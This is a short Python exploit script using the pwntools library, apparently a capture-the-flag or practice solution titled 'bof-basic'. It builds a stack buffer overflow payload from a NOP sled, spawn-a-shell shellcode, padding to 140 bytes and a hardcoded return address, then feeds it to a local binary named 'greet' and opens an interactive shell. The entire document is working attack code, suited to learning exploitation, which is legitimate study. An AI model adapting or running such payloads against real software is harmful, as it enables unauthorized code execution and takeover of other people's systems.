from pwn import *
"""
    Title: bof-basic
    By: Jusmistic
"""
def pwn():
    """
        Padding = 140 
        Exploit
        [ nop x 50 ][shellcode x 44][padding x (140-50-44)][ saved_eip ]
    """
    context.update(arch='i386', os='linux')
    shellcode = asm(shellcraft.i386.linux.sh()) #len 44
    nopsled = '\x90'*50
    padding = "A"*(140 - len(shellcode) - len(nopsled))
    eip = p32(0xffffd660+30) #Add for Env

    exploit = nopsled + shellcode + padding + eip
    proc = process('./greet')
    proc.sendline(exploit)
    proc.interactive()
pwn()